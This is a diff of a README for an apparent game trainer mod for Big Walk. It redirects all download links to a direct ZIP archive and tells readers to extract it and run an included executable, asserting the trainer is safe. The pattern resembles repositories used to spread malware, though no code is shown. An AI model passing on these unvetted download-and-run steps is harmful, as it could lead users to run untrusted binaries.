@@ -1,6 +1,6 @@
 # big-walk-trainer-mod
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases/latest)
-[![GitHub release](https://img.shields.io/badge/Release-v1.0.0-blue?style=for-the-badge)](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases/download/v1.1.0/Big.Walk-Trainer-Mod-1.1.0.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.1.0-blue?style=for-the-badge)](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases/download/v1.1.0/Big.Walk-Trainer-Mod-1.1.0.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Stars](https://img.shields.io/github/stars/pierlevelembroider/big-walk-trainer-mod?style=for-the-badge)](https://github.com/pierlevelembroider/big-walk-trainer-mod/stargazers)
 
@@ -25,10 +25,10 @@ An open-source trainer (mod menu whatever) for the coop exploration game Big Wal
 ---
 
 ## How to Install
-1.  Download the [latest ZIP archive from the Releases page](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases/download/v1.0.0/Big.Walk.Trainer.Mod.1.0.0.zip).
+1.  Download the [latest ZIP archive from the Releases page](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases/download/v1.1.0/Big.Walk-Trainer-Mod-1.1.0.zip).
 2.  Extract the contents to any folder (or desktop).
 3.  Launch the game.
-4.  Run `BW-trainer-github-v1.0.0.exe`.
+4.  Run `BW-trainer-github-v1.1.0.exe`.
 5.  Enjoy. Open your menu using `Insert` key.
 
 ---
@@ -49,6 +49,6 @@ No. Big Walk is primarily a singleplayer/coop game so using a trainer is safe.
 
 ---
 
-[Latest Release Version](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases/latest)
+[Latest Release Version](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases/download/v1.1.0/Big.Walk-Trainer-Mod-1.1.0.zip)
 
 Built with C++
